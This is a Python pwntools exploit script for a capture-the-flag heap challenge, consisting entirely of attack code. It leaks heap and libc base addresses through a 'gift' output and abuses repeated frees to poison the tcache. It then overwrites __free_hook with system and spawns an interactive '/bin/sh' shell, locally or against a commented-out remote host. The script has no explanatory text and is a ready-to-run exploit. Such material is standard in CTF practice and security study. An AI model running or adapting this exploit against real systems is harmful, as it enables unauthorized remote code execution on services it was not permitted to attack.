from pwn import *
context.log_level = 'debug'
def add(p, idx, size, s):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('index')
    p.sendline(str(idx))
    p.recvuntil('size')
    p.sendline(str(size))
    p.recvuntil('something')
    p.send(s)

def delete(p, idx):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(idx))

def getshell(ip, port):
    libc = ELF('./libc.so.6', checksec=False)
    if ip == '':
        p = process('./update/pwn')
    else:
        p = remote(ip, port)
    add(p, 0, 0x68, 'a')
    p.recvuntil('gift :0x')
    heap_base = int(p.recvuntil('\n', drop=True), 16) - 0x11e70
    log.info(hex(heap_base))
    add(p, 1, 0x68, 'a')
    add(p, 2, 0x68, 'a')
    add(p, 3, 0x68, 'a')

    delete(p, 0)
    delete(p, 0)
    delete(p, 0)

    add(p, 4, 0x68, p64(heap_base + 0x11ed0))
    add(p, 5, 0x68, 'a')
    payload = p64(0) + p64(0xe1)
    add(p, 6, 0x68, payload)
    for i in range(8):
        delete(p, 1)
    add(p, 7, 0x68, '\xa0')
    delete(p, 0)
    delete(p, 0)
    delete(p, 0)
    delete(p, 0)
    add(p, 8, 0x68, p64(heap_base + 0x11ee0))
    add(p, 9, 0x68, 'a')
    add(p, 10, 0x68, 'a')
    add(p, 11, 0x68, '\x00')
    p.recvuntil('gift :0x')
    libc_base = int(p.recvuntil('\n', drop=True), 16) - 0x3ebda0
    log.info(hex(libc_base))
    libc.address = libc_base
    delete(p, 0)
    delete(p, 0)
    delete(p, 0)
    add(p, 12, 0x68, p64(libc.sym['__free_hook']))
    add(p, 13, 0x68, '/bin/sh\x00')
    add(p, 14, 0x68, p64(libc.sym['system']))
    delete(p, 0)

    #gdb.attach(p)

    p.interactive()
#getshell('172.16.9.21', 9006)
getshell('', 9006)
